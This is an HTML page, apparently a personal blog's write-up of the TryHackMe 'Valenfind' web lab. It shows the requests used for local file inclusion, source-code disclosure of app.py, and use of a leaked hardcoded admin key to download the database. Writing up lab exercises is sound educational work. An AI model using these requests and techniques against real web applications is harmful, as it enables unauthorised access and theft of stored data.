@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>0xReva — Valenfind Write-up</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-primary: #080808;
+            --bg-secondary: #111111;
+            --text-primary: #e8e8e8;
+            --text-secondary: #666666;
+            --accent: #e8e8e8;
+            --accent-dim: #aaaaaa;
+            --border: #1e1e1e;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        .matrix {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.04;
+        }
+
+        .container {
+            max-width: 760px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 0.85rem;
+            margin-bottom: 3rem;
+            transition: color 0.2s ease;
+        }
+
+        .back-link:hover { color: var(--accent); }
+
+        .writeup-header {
+            margin-bottom: 3rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid var(--border);
+            animation: fadeInDown 0.7s ease-out;
+        }
+
+        .writeup-header h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff 0%, #aaaaaa 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1rem;
+        }
+
+        .writeup-tags {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tag {
+            display: inline-flex;
+            align-items: center;
+            font-size: 0.72rem;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            color: var(--accent-dim);
+        }
+
+        .tag img {
+            width: 16px;
+            height: 16px;
+            object-fit: contain;
+            border-radius: 3px;
+        }
+
+        .tag.web    { border-color: #2a3a2a; color: #6a9a6a; }
+        .tag.medium   { border-color: #2a3a2a; color: #9a8a5a; }
+        .tag.thm    { border-color: #1e2e3e; padding: 0.2rem 0.4rem; }
+        .tag.date   { color: var(--text-secondary); border-color: var(--border); }
+
+        .writeup-body {
+            animation: fadeIn 0.8s ease-out 0.2s both;
+        }
+
+        .writeup-body h2 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--accent);
+            margin: 2.5rem 0 1rem;
+            padding-left: 0.75rem;
+            border-left: 2px solid var(--accent-dim);
+        }
+
+        .writeup-body p {
+            color: #b0b0b0;
+            font-size: 0.92rem;
+            margin-bottom: 1rem;
+        }
+
+        .writeup-body strong {
+            color: var(--text-primary);
+            font-weight: 600;
+        }
+
+        pre {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.2rem 1.4rem;
+            overflow-x: auto;
+            margin: 1rem 0 1.5rem;
+        }
+
+        pre code {
+            font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+            font-size: 0.82rem;
+            color: #c8c8c8;
+            line-height: 1.6;
+        }
+
+        p code, li code {
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            font-size: 0.82rem;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            color: #b8c8b8;
+        }
+
+        .kw  { color: #aaaacc; }
+        .str { color: #8aaa8a; }
+        .fn  { color: #aaccaa; }
+        .num { color: #ccaa88; }
+        .key { color: #cc9988; }
+
+        .info-box {
+            background: #0e1a0e;
+            border: 1px solid #2a3a2a;
+            border-radius: 8px;
+            padding: 1rem 1.25rem;
+            margin: 1.5rem 0;
+            font-size: 0.88rem;
+            color: #7aaa7a;
+        }
+
+
+        hr {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 2.5rem 0;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 4rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 600px) {
+            .container { padding: 2rem 1rem; }
+            .writeup-header h1 { font-size: 1.6rem; }
+        }
+    </style>
+</head>
+<body>
+    <canvas class="matrix"></canvas>
+
+    <div class="container">
+
+        <a href="../writeup.html" class="back-link">&#8592; back to write-ups</a>
+
+        <div class="writeup-header">
+            <h1>Valenfind</h1>
+            <div class="writeup-tags">
+                <span class="tag thm">
+                    <img src="../../images/6.jpg" alt="TryHackMe">
+                </span>
+                <span class="tag web">Web</span>
+                <span class="tag medium">Medium</span>
+                <span class="tag date">Feb 2026</span>
+            </div>
+        </div>
+
+        <div class="writeup-body">
+
+            <h2>Enumeration</h2>
+            <p>
+                Starting by exploring the web application and intercepting traffic with <strong>Burp Suite</strong>, I quickly spotted an interesting endpoint:
+            </p>
+            <pre><code>GET /api/fetch_layout?layout=theme_classic.html</code></pre>
+            <p>
+                The <code>layout</code> parameter looked injectable — it seemed to be fetching a file server-side. Classic LFI candidate.
+            </p>
+            <p>
+                I also noticed a useful header in every response:
+            </p>
+            <pre><code>Server: Werkzeug/3.0.1 Python/3.12.3</code></pre>
+            <p>
+                Python backend confirmed. This is relevant for knowing which config files to target later.
+            </p>
+
+            <h2>LFI ( local file inclusion )</h2>
+            <p>
+                First reflex: replace the parameter value with <code>/etc/passwd</code>. No output. I spent about 10 minutes fuzzing different paths and payloads, then tried something different — <strong>sending an empty value</strong>.
+            </p>
+            <pre><code>GET /api/fetch_layout?layout=</code></pre>
+            <div class="info-box">
+                Tips : Sending an empty parameter instead of a payload can sometimes leak backend info — here it revealed the full internal directory structure.
+            </div>
+            <pre><code>/opt/Valenfind/templates/components</code></pre>
+            <p>
+                Now I had the full server path. From here, I started fetching known Python app files since I knew the backend was Python.
+            </p>
+
+            <h2>Source Code Disclosure</h2>
+            <p>
+                Using the leaked base path, I walked up the directory tree and tried common filenames:
+            </p>
+            <pre><code>GET /api/fetch_layout?layout=/opt/Valenfind/app.py</code></pre>
+            <p>
+                The full source code of the application leaked. Inside <code>app.py</code>, two things caught my eye immediately.
+            </p>
+            <p>First, a hardcoded API key:</p>
+            <pre><code><span class="key">ADMIN_API_KEY</span> = <span class="str">"CUPID_MASTER_KEY_2024_XOXO"</span></code></pre>
+            <p>Second, a protected admin route:</p>
+            <pre><code><span class="kw">@app.route</span>(<span class="str">'/api/admin/export_db'</span>)
+<span class="kw">def</span> <span class="fn">export_db</span>():
+    auth_header = request.headers.get(<span class="str">'X-Valentine-Token'</span>)
+    <span class="kw">if</span> auth_header == ADMIN_API_KEY:
+        <span class="kw">try</span>:
+            <span class="kw">return</span> send_file(DATABASE, as_attachment=<span class="num">True</span>,
+                             download_name=<span class="str">'valenfind_leak.db'</span>)
+        <span class="kw">except</span> Exception <span class="kw">as</span> e:
+            <span class="kw">return</span> str(e)
+    <span class="kw">else</span>:
+        <span class="kw">return</span> jsonify({<span class="str">"error"</span>: <span class="str">"Forbidden"</span>}), <span class="num">403</span></code></pre>
+
+            <h2>Exploiting the Admin Endpoint</h2>
+            <p>
+                The logic is straightforward: hit <code>/api/admin/export_db</code> with the right token in the <code>X-Valentine-Token</code> header. Back in Burp Suite:
+            </p>
+            <pre><code>GET /api/admin/export_db HTTP/1.1
+Host: &lt;host&gt;
+X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO</code></pre>
+            <p>
+                The server responded with a database file download: <code>valenfind_leak.db</code>. Opening it revealed the flag.
+            </p>
+
+            <hr>
+
+            <h2>Summary</h2>
+            <p>
+                The attack chain was: <strong>LFI via empty parameter</strong> &#8594; leaked internal path &#8594; <strong>source code disclosure</strong> via <code>app.py</code> &#8594; hardcoded admin key &#8594; <strong>authenticated DB export</strong>.
+            </p>
+            <p>
+                The key finding was that an empty parameter triggered a directory listing instead of an error — something easy to miss if you jump straight to classic traversal payloads. Always test edge cases.
+            </p>
+
+        </div>
+
+        <footer class="footer">
+            <p>contact : revaa@proton.me</p>
+            &#169; 2026 All rights reserved.
+        </footer>
+    </div>
+
+    <script>
+        const canvas = document.querySelector('.matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*";
+        const fontSize = 14;
+        const drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+        function draw() {
+            ctx.fillStyle = 'rgba(8,8,8,0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#c8c8c8';
+            ctx.font = fontSize + 'px monospace';
+            drops.forEach((y, i) => {
+                ctx.fillText(chars[Math.floor(Math.random() * chars.length)], i * fontSize, y * fontSize);
+                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(draw, 50);
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+</body>
+</html>
